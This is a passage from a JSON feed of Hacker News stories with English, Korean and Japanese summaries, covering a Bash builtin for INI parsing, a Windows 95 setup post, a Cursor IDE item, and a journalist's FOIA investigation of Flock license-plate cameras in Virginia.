binary, perhaps something\nakin to ruby-packer but for\nBash. Bring your ideas!\nFurther Reading\n\nThe full source code of this ini\nbuiltin\nThe inih library used to parse the INI\nconfigs\nBash builtin examples from Bash’s source\ncode\n\nAcknowledgments\nThanks to Randall Mason for\nproviding feedback on this post.",
    "summary": {
      "en": "### Summary: Writing a Bash Builtin in C to Parse INI Configs\n\nThis text discusses how to create a custom Bash builtin in C to parse INI configuration files. \n\n#### Key Points:\n\n1. **Why Not Use Bash Alone?** \n   - Bash is great for automating tasks but not ideal for parsing INI files, which can lead to messy and complex scripts. Instead, writing a builtin can simplify the process.\n\n2. **What is a Bash Builtin?**\n   - A builtin is a command implemented directly in Bash itself, rather than as a separate program. Examples include `echo`, `printf`, and `cd`. Builtins are often faster and more efficient than external commands.\n\n3. **Benefits of Writing a Builtin:**\n   - Builtins can avoid the overhead of creating a new process.\n   - They can modify the shell's internal state, which is essential for certain tasks.\n   - The article focuses on creating a builtin for parsing INI files, which will demonstrate these benefits.\n\n4. **Example of a Minimal Builtin (sleep):**\n   - The text describes how to implement a simple `sleep` command as a builtin to show the process of creating and registering a new builtin with Bash.\n\n5. **Creating an INI Parser Builtin:**\n   - The parser reads INI files from standard input and stores the data in associative arrays. \n   - It includes generating help output, parsing command options, and injecting data into Bash's internal state.\n\n6. **Implementation Details:**\n   - The builtin is designed to read INI sections into associative arrays, with specific options for global or local variable scope.\n   - The text discusses the use of a handler function that processes each section and key-value pair in the INI file.\n\n7. **Building and Testing:**\n   - A Makefile is provided to compile the builtin, and a script is used for testing its functionality.\n\n8. **Conclusion:**\n   - Bash builtins are powerful tools for extending functionality. There is potential for more innovation and distribution of custom builtins, which could enhance their utility in scripting.\n\nOverall, the text serves as a guide for developers interested in extending Bash by creating custom builtins in C, particularly for tasks like parsing configuration files.",
      "ko": "이 글에서는 C 언어로 INI 구성 파일을 파싱하기 위한 맞춤형 Bash 내장 명령어를 만드는 방법에 대해 설명합니다.\n\nBash는 작업 자동화에 유용하지만 INI 파일을 파싱하는 데는 적합하지 않아 복잡하고 지저분한 스크립트가 생길 수 있습니다. 따라서 내장 명령어를 작성하면 이 과정을 간소화할 수 있습니다.\n\nBash 내장 명령어란 Bash 자체에 직접 구현된 명령어로, 별도의 프로그램이 아닙니다. 예를 들어 `echo`, `printf`, `cd` 등이 있습니다. 내장 명령어는 외부 명령어보다 빠르고 효율적입니다.\n\n내장 명령어를 작성하는 장점은 여러 가지가 있습니다. 새로운 프로세스를 생성하는 오버헤드를 피할 수 있고, 특정 작업에 필수적인 셸의 내부 상태를 수정할 수 있습니다. 이 글에서는 INI 파일을 파싱하기 위한 내장 명령어를 만드는 데 초점을 맞추어 이러한 장점을 보여줍니다.\n\n간단한 내장 명령어인 `sleep`의 예를 통해 새로운 내장 명령어를 생성하고 Bash에 등록하는 과정을 설명합니다. 이 파서는 표준 입력에서 INI 파일을 읽고 데이터를 연관 배열에 저장합니다. 또한 도움말 출력을 생성하고, 명령 옵션을 파싱하며, Bash의 내부 상태에 데이터를 주입하는 기능도 포함됩니다.\n\n내장 명령어는 INI 섹션을 연관 배열로 읽도록 설계되었으며, 전역 또는 지역 변수 범위에 대한 특정 옵션이 있습니다. 각 섹션과 키-값 쌍을 처리하는 핸들러 함수의 사용에 대해서도 논의합니다.\n\n내장 명령어를 컴파일하기 위한 Makefile이 제공되며, 기능을 테스트하기 위한 스크립트도 포함되어 있습니다.\n\nBash 내장 명령어는 기능을 확장하는 강력한 도구입니다. 맞춤형 내장 명령어의 혁신과 배포 가능성은 스크립팅에서의 유용성을 더욱 높일 수 있습니다. 이 글은 구성 파일을 파싱하는 작업과 같은 기능을 위해 C로 맞춤형 내장 명령어를 만드는 데 관심이 있는 개발자들을 위한 가이드 역할을 합니다.",
      "ja": "この文章では、INI設定ファイルを解析するためにC言語でカスタムBashビルトインを作成する方法について説明しています。\n\nBashはタスクの自動化に優れていますが、INIファイルの解析には向いていないため、複雑で扱いにくいスクリプトになりがちです。そこで、ビルトインを作成することでプロセスを簡素化できます。\n\nBashビルトインとは、Bash自体に直接実装されたコマンドのことです。例えば、`echo`や`printf`、`cd`などがあります。ビルトインは外部コマンドよりも高速で効率的です。\n\nビルトインを作成する利点には、新しいプロセスを作成するオーバーヘッドを避けられることや、シェルの内部状態を変更できることがあります。この記事では、INIファイルを解析するためのビルトインを作成することに焦点を当てており、これらの利点を示しています。\n\n最小限のビルトインの例として、`sleep`コマンドの実装方法が説明されています。これにより、新しいビルトインをBashに登録するプロセスが示されます。\n\nINIパーサービルトインは、標準入力からINIファイルを読み込み、データを連想配列に格納します。また、ヘルプ出力の生成やコマンドオプションの解析、Bashの内部状態へのデータ注入も含まれています。\n\n実装の詳細として、ビルトインはINIセクションを連想配列に読み込むように設計されており、グローバルまたはローカル変数スコープの特定のオプションがあります。INIファイル内の各セクションやキーと値のペアを処理するハンドラ関数の使用についても説明されています。\n\nビルトインをコンパイルするためのMakefileが提供されており、その機能をテストするためのスクリプトも用意されています。\n\nBashビルトインは機能を拡張するための強力なツールです。カスタムビルトインの革新や配布の可能性があり、スクリプトにおける有用性を高めることが期待されます。この文章は、設定ファイルの解析などのタスクのためにC言語でカスタムビルトインを作成したい開発者向けのガイドとなっています。"
    }
  },
  {
    "id": "37d2b7611a1e31d6",
    "title": {
      "en": "A note on the USB-to-PS/2 mouse adapter that came with Microsoft mouse devices",
      "ko": "마이크로소프트 마우스 어댑터 팁",
      "ja": "マイクロソフトのマウスアダプター解説"
    },
    "type": "story",
    "url": "https://devblogs.microsoft.com/oldnewthing/20250325-00/?p=110993",
    "score": 372,
    "by": "luu",
    "time": 1743120989,
    "content": "March 18, 2025\n      Why didn’t Windows 95 setup use a miniature version of Windows 95 as its fallback GUI?\n\n        Raymond Chen",
    "summary": {
      "en": "On March 18, 2025, Raymond Chen posed a question about why the setup process for Windows 95 didn't use a smaller version of Windows 95 as a backup graphical user interface (GUI) in case of issues.",
      "ko": "2025년 3월 18일, 레이먼드 첸은 윈도우 95의 설치 과정에서 문제가 발생할 경우를 대비해 작은 버전의 윈도우 95를 백업 그래픽 사용자 인터페이스(GUI)로 사용하지 않은 이유에 대해 질문을 던졌습니다.",
      "ja": "2025年3月18日、レイモンド・チェンは、Windows 95のセットアッププロセスにおいて、問題が発生した際のバックアップ用のグラフィカルユーザーインターフェース（GUI）として、Windows 95の小型版を使用しなかった理由について疑問を呈しました。"
    }
  },
  {
    "id": "327ccb524a039975",
    "title": {
      "en": "Show HN: Cursor IDE now remembers your coding prefs using MCP",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": null,
    "score": 98,
    "by": "roseway4",
    "time": 1743173099,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "44e224563abf2956",
    "title": {
      "en": "I asked police to send me their public surveillance footage of my car",
      "ko": "내 차 CCTV 요청!",
      "ja": "車の監視映像請求"
    },
    "type": "story",
    "url": "https://cardinalnews.org/2025/03/28/i-drove-300-miles-in-rural-virginia-then-asked-police-to-send-me-their-public-surveillance-footage-of-my-car-heres-what-i-learned/",
    "score": 629,
    "by": "bookofjoe",
    "time": 1743164046,
    "content": "<iframe title=\"Everlit Audio Player\" src=\"https://everlit.audio/embeds/artl_eQjyeH7pmVP?client=wp&amp;client_version=1.10.5\" width=\"100%\" height=\"130px\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"\"></iframe>Two police officers walked into a doughnut shop.\n\nIt’s not the opening line of a joke; it’s what I saw as I was working on an early draft of this story in March at the Staunton Dunkin’, about a quarter mile from where my vehicle was captured on a Flock camera in January and February coming back from my trips to Cardinal’s Roanoke office.\n\nTheir eyes may have strayed to the racks of Boston creme, lemon-filled and coconut-covered doughnuts as they strode to the counter with purpose, but they were here for something else.\n\nSurveillance footage.\n\nwindow.zone_load_1970831728 = function(z, d) { if (!d.count) document.getElementById('zone_load_1970831728').style.display = 'none'; };\n\n\t\t\t\tDon't miss another story! Sign up for Cardinal’s free daily newsletter.\n\nDelivered to your inbox every day at 5 a.m.\n\n\t\t\t\t\t\tSign up\n\n\t\tThe research for State of Surveillance showed that you can’t drive anywhere without going through a town, city or county that’s using public surveillance of some kind, mostly license plate reading cameras. I wondered how often I might be captured on camera just driving around to meet my reporters. Would the data over time display patterns that would make my behavior predictable to anyone looking at it?\n\nSo I took a daylong drive across Cardinal Country and asked 15 law enforcement agencies, using Freedom of Information Act requests, to provide me with the Flock LPR footage of my vehicle. My journey took me over 300 miles through slices of the communities those agencies serve, including the nearly 50 cameras they employ. And this journey may take me to one more place: an April Fool’s Day hearing in a courtroom in Roanoke. There, a judge will be asked to rule on a motion to declare the footage of the public to be beyond the reach of the public.\n\nBut while Roanoke and Botetourt and two other police agencies denied my request for that footage, nine agencies complied and searched their data for signs of me passing through.\n\nHere’s what I found.\n\nCheck out our podcast episode on Jeff’s surveillance investigation.\n\n   Watch    February 13, 2025, I left Staunton around 7:30 in the morning to head toward Roanoke. Richmond Avenue, on the outskirts of the city, is probably the way most people make their way out of town to interstates 64 and 81. It’s a significant crossroad of the region’s major east-west and north-south highways.\n\nStaunton maintains at least one of its six Flock cameras on a local intersection just shy of the cluster of on- and off-ramps. It makes surveillance-sense to position cameras to see who’s coming in and who’s leaving your town at such a singular crossroad.\n\nI was not captured by a Flock camera there, though.\n\nAs part of its services, Flock advises police on where to place its tech. The top priority appears to be places of entry and exit around the community, notably near the main highways. It’s possible that Staunton doesn’t have a camera taking pictures of who is leaving town; it’s also possible my vehicle’s plate was blocked by heavy morning traffic and so no photo could be taken.\n\nIt was a cold morning, but truckers and car drivers were behaving on the morning commute. Staying on I-81, I passed through Augusta, Rockbridge and Botetourt counties, which between them have at least eight Flock cameras. I didn’t think any would be pointed at the main highway because currently Flock can’t place its cameras on state property.\n\nNinety uneventful minutes later, I pulled into Roanoke to go to the Cardinal office and visit my Roanoke members of our own Cardinal team — which, in an unintentional irony in this story, we refer to as The Flock.\n\nI got into town just after 9:15 a.m. I know that because a Roanoke Police Department Flock camera captured my car traveling southbound down Williamson Road near the Salem Avenue intersection at 9:16:09 a.m. (That photo, as well as another, were provided by the Staunton police, as part of their arrangement to access other agencies’ data in their Flock searches.)\n\nYou can see from the image below exactly what Flock technology captures: a decent shot of the back of any vehicle that passes, a readable image of the license plate.\n\nPart of Flock’s proprietary tech determines the make and model of the vehicle and also notes if there are bumper stickers, bike racks, any other unique markings that would help identify that vehicle. That generates a “vehicle fingerprint” for every car or truck, which none of the agencies I FOIA’d would provide me. That fingerprint could prove helpful in the case where a witness or other camera captured some non-license-plate information about a vehicle, like specific bumper stickers or a roof rack.\n\nI parked my car on Church Avenue, walked to the office and logged in to our morning news meeting. Some of our reporters were there in person; others began popping up on the screen from their beats in Danville, Martinsville and Bristol. We talked about our day’s work. Afterward, I drove around town just to see if I’d be picked up in a residential area. I started in Gainsboro. Snow covered the ground around the homes on Gilmer Avenue. I did not notice any cameras.\n\nI crossed town to Marshall Avenue and a neighborhood within a few blocks of the YMCA, and then on to another neighborhood sitting next to Interstate 581, which reaches across the town like a tight belt of loud traffic. Looking between homes, I saw the Roanoke Star, perched over trees frosted with ice not yet melted.\n\nEach of these neighborhoods had different backstories and histories you could see in the architecture of their homes, in the cars that parked on their streets. One thing they had in common on that cold morning: They were all very quiet. And I did not see any surveillance cameras.\n\nLater, I received no images of my car in those places. Flock can be used to monitor public space in suspected high-crime areas, which has earned it the wrath of rights organizations including the ACLU. Because Roanoke has only five cameras, according to contracts we received from the city, it’s my guess they are not yet focusing on specific populations or neighborhoods.\n\nAfter those brief stops, I left town mid-morning. I can’t tell you exactly when, and I’ll tell you why that’s relevant.\n\nWhen I eventually received data from the Staunton Police about my trip, I noticed that Flock cameras had photographed my vehicle in similar locations within both Staunton and Roanoke at similar times on another day, January 29. If you asked me today if I knew whether I had made a trip to the Roanoke office on Jan. 29, I would hesitate before I could answer. I would have to check my calendar and emails to be able to say that I was there, with certainty.\n\nBut the police would have known, if they wanted to, without asking for any kind of warrant or court order.\n\nCheck out the other stories in this ongoing series.\n\n\t\t\t\t\t\tCity of Roanoke, Botetourt County sheriff go to court over FOIA request\n\n\t\t\t\t\t\tState of Surveillance: Everyone’s watching\n\n\t\t\tFranklin County does have four Flock cameras, but my vehicle’s image was not captured by any of them. Until I came into town, I was staying on routes 220 and 57.\n\nU.S. 220 was a misty spectacle on Feb. 13. Ice made trees sag. Thick limbs and branches crashed under the weight, closing the right lane of the highway in some places. Snow covered shaded places around buildings, but the roads were mostly clear, and traffic moved along. Nearing noon, milder temps had caused fog to rise up from the hollers. As I drove south past Boones Mill and Trump Town USA, I knew I would not trigger that town’s lone operational Flock camera. It’s set up to catch northbound traffic.\n\nI entered Martinsville via Fayette Street. Martinsville has dozens of Flock cameras, 48 according to the contracts Cardinal News gathered, so I expected to be picked up multiple times. However, my vehicle was detected only once.\n\nEven the police chief, Rob Fincher, was surprised. He was open to running the test again, but I wasn’t trying for statistical accuracy; I wanted this to be a record of a single day. There are lots of things that can get in the way of taking a clear picture, including glare and shadow and other things (cars in this case) getting between your camera and your subject. Some of those things may have been at play on that particular day.\n\nA Martinsville Flock camera did spot my vehicle at 12:11 p.m. eastbound on the way into town from its perch near the corner of West Church Street and South Memorial Boulevard.\n\nTwenty-two minutes later I was spreading cream cheese on a bagel and coffee at the Ground Floor. (I know the time because I took my own photo, not because of a surveillance camera timestamp.)\n\nThe place was bustling. On most tables stood a little rubbery Jesus toy. On one wall hangs a long roll of brown paper where people casually write their prayers. I was reminded that some people believe you’re being watched 24/7 by a higher power, though I’d argue there’s likely a pretty high trust factor about how that surveillance might be utilized. I touched base with our Martinsville reporter Dean-Paul Stephens, and then headed for Danville.\n\n* * *\n\nSpeaking of trust and ethics: two weeks later, Lt. Greg Jones called me at the Roanoke office. The Amherst County Sheriff’s Office had a question about my request for data about my vehicle.\n\n“You weren’t trying to spy on a cheating wife or something like that, were you?” he asked.\n\nI assured him that I wasn’t. As Cardinal Executive Director Luanne Rife points out in her column on Sunshine Week, public agencies don’t have to agree with why you’re asking for their public information. The idea is that it belongs to you already. They are under legal obligation to provide it to you.\n\nNot to say this question didn’t cause some thought and conversation in the newsroom. Public surveillance data like this could indeed be used to stalk an ex; it could also be used by a person suspicious their ex is stalking them to see if their ex’s vehicle actually could be found on the same roads as theirs and at the same times, which could then be used to secure a protective order or even open a criminal investigation. It could be used by private investigators to find bail jumpers and missing persons. Now imagine all those requests coming in to the local police agency…\n\nThe only reason it hadn’t happened yet was because people really didn’t know they could do that. Suddenly the cops could be in the position to find themselves spending hours looking up public surveillance for citizens with all sorts of reasons to utilize the data.\n\nSo was this a fool’s errand I was on? I didn’t think so. The police in over 80 of our local communities had chosen to start photographing citizens in their vehicles in public and sharing this with other agencies in our region and beyond, even out of state. I wasn’t the one running over 500 searches a month on its citizens, as the Roanoke police were doing. And who knows who they were running those searches on, and why?\n\n* * *\n\nBy the time I reached Danville, the weather was almost warm. The sun was out and glancing through the empty trees along Craghead Street and in through the plate glass windows of Links Coffee House.\n\nI found out after requesting data from Danville that while they did have a contract with Flock, they had not yet installed the Flock cameras, according to Matt Bell, the city’s PR specialist.\n\nThe coffee was good. The casual conversation surveillance was rich with interesting dialogues. But I had miles to go. It was just before 2 p.m. Time to get moving again.\n\n* * *\n\nTraffic in Lynchburg was heavy around 3:30 p.m. as I drove north along U.S. 29 Business. I figured there might be at least some of Lynchburg’s Flock cameras along the very busy Business 29, also known in that area as Wards Road.\n\nJust south of Liberty University, a Flock camera picked up my car near Wards Ferry Road. Lynchburg has at least a dozen Flock cameras, according to contracts we got from them during our reporting for our first State of Surveillance story. I figured one might be on this stretch of road.\n\nBy this point in the afternoon, the novelty of the day was wearing off. I got back on main route 29 and headed north.\n\nAlong the rest of the way, I passed through Amherst County, which has four Flock cameras; Nelson County, which has none; and Augusta County, with two cameras. Since I stuck to the main roads, U. S. 29 and then I-64, the chances of running into a camera were low. If I’d pulled off onto a main county road, things might have been different.\n\nIn March, Amherst would conduct a search and be unable to find my vehicle. Same with Augusta County.\n\nAt 4:59 p.m., I exited the highway onto Richmond Avenue in Staunton. This time a Flock camera spotted my vehicle and got a clear picture. I went home and ordered pizza.\n\nWhich brings me back to the cops in the coffee shop, a few weeks later.\n\n* * *\n\nAs I mentioned, the two police officers were not interested in doughnuts, or even coffee. They asked to speak to the manager. The counter person explained that the manager was at the other store across town. They asked if they could speak to that person on the phone.\n\nIt was then I noticed that a person who had come in with them was part of this conversation.\n\nFrom what I could gather, because I didn’t pull out my press badge and start asking questions, the young woman with them had been in some kind of incident; and that the police had determined that maybe some of the video footage that Dunkin takes of its drive-through may have caught the other car as it passed on the road beyond; or maybe the offending vehicle had come through the drive-through.\n\nIn a few minutes, the officers and the woman were guided behind the counter to review footage.\n\nThis scene somehow made me feel optimistic about how we’re already using such technology. It still operates under the notion that not all data belongs to the police. They have to ask, or convince a judge to give them a court order.\n\nYet just glancing at the footage I have included in this story, it’s also a little creepy to see how as few as four to six pictures, properly time- and date-stamped, can establish patterns that could enable someone to know with some likelihood how they could intercept me on my way to work one morning.\n\nThere are two differences between police use of other visual data (like a store’s security video) and Flock’s gathering of public footage (such as my car). In that first case, there’s a crime involved. And the privately captured video is granted to police voluntarily and for a good reason. It’s not theirs to take and examine at their leisure.\n\nPublic-facing LRP cameras like Flock’s, on the other hand, capture vast amounts of data unrelated to any criminal activity. And there’s zero oversight outside of the law enforcement community.This goes back to the idea that footage taken of me in public, non-investigative in nature, can be considered investigative and not subject to a public information request, and concerns me.\n\nThe idea that a law enforcement agency will claim the images that we see in this story are “investigative” in nature — and need to be protected from me — tells me that they are worried about something else. What is it?\n\nIt’s a paradigm shift where we go from having an expectation of privacy even in public spaces to its inverse. Not only do we not have a right to privacy in public; we don’t even have a right to see ourselves as the government and police might see us — a set of still moments in place and time from which they, not us, can decide what our story is.\n\nWe want to know what you think! Tell us what you think about surveillance or share your experiences here.\n\n\t\t\t\tEnjoying our free stories?\n\nDonate today to help Cardinal News remain free for everyone.\n\n\t\t\t\tOne-time\n\n\t\t\t\tMonthly\n\n\t\t\t\tAnnually\n\n\t\t\tOne-time\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$150\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$200\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$500\n\n\t\t\t\t\t\t\t\t\t\t\t\tOther\n\n\t\t\t\t\t\t\t\t\t\t\t\tDonation amount\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$\n\n\t\t\tMonthly\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$15\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$20\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$50\n\n\t\t\t\t\t\t\t\t\t\t\t\tOther\n\n\t\t\t\t\t\t\t\t\t\t\t\tDonation amount\t\t\t\t\t\t\t\t\t\t\t\tper month\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$\n\n\t\t\tAnnually\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$150\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$200\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$500\n\n\t\t\t\t\t\t\t\t\t\t\t\tOther\n\n\t\t\t\t\t\t\t\t\t\t\t\tDonation amount\t\t\t\t\t\t\t\t\t\t\t\tper year\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t$\n\n\t\t\tThanks for joining our flock!\n\n\t\t\tDonate Now\n\n\tRelated stories\n\n\t\tTagged: Redbird Stories,State of Surveillance",
    "summary": {
      "en": "Two police officers visited a Dunkin' doughnut shop not for coffee, but to request surveillance footage. This highlights the growing presence of public surveillance, particularly license plate reading (LPR) cameras, in communities. The author undertook a drive across the region, requesting footage of their vehicle from law enforcement agencies to explore the extent of surveillance data available.\n\nDuring the journey, the author noted different locations where Flock cameras are installed, observing that while some areas were covered, their vehicle was not always captured by the cameras. The investigation revealed that police can easily track individuals' movements through this data, raising concerns about privacy and the potential misuse of surveillance information.\n\nThe author also reflected on the ethical implications of surveillance, considering how accessible this data could be misused and the lack of oversight in its collection. The narrative concludes with the notion that citizens may not have the right to see how they are viewed by law enforcement, signaling a shift in expectations of privacy in public spaces.",
      "ko": "두 명의 경찰관이 던킨 도넛 가게를 방문한 이유는 커피를 마시기 위해서가 아니라, 감시 카메라 영상을 요청하기 위해서였다. 이는 지역 사회에서 공공 감시, 특히 차량 번호판 인식 카메라의 존재가 점점 더 커지고 있음을 보여준다. 저자는 이 지역을 차로 돌아다니며, 자신의 차량에 대한 영상을 법 집행 기관에 요청해 감시 데이터의 범위를 조사했다.\n\n여행 중 저자는 플록 카메라가 설치된 다양한 장소를 확인했으며, 일부 지역에서는 감시가 이루어졌지만 자신의 차량이 항상 카메라에 포착되지는 않았다는 점을 관찰했다. 조사 결과, 경찰이 이 데이터를 통해 개인의 이동을 쉽게 추적할 수 있다는 사실이 드러났고, 이는 사생활 침해와 감시 정보의 오용 가능성에 대한 우려를 불러일으켰다.\n\n저자는 또한 감시에 대한 윤리적 함의에 대해 생각해보았다. 이 데이터가 얼마나 쉽게 오용될 수 있는지와 수집 과정에서의 감독 부족에 대해 고민했다. 이야기는 시민들이 법 집행 기관에 의해 어떻게 인식되는지를 알 권리가 없을 수도 있다는 점을 언급하며, 공공 장소에서의 사생활 기대치가 변화하고 있음을 시사하며 마무리된다.",
      "ja": "二人の警察官がダンキンドーナツ店を訪れたのはコーヒーを求めるためではなく、監視カメラの映像をリクエストするためでした。これは、特にナンバープレートを読み取るカメラのような公共の監視が地域社会で増えていることを示しています。著者は地域をドライブし、法執行機関に自分の車の映像を求めて、どれだけの監視データが利用可能かを探りました。\n\n旅の途中で、著者はフロックカメラが設置されているさまざまな場所を確認しました。一部のエリアでは監視が行われていましたが、著者の車が常にカメラに捉えられているわけではありませんでした。この調査から、警察がこのデータを通じて個人の動きを簡単に追跡できることが明らかになり、プライバシーや監視情報の悪用についての懸念が高まりました。\n\n著者はまた、監視の倫理的な側面について考えました。このデータがどれほど簡単に悪用される可能性があるか、そしてその収集に対する監視が欠如していることについても触れました。物語は、市民が法執行機関にどのように見られているかを知る権利がないかもしれないという考えで締めくくられ、公共の場におけるプライバシーの期待が変わりつつあることを示唆しています。"
    }
  }
]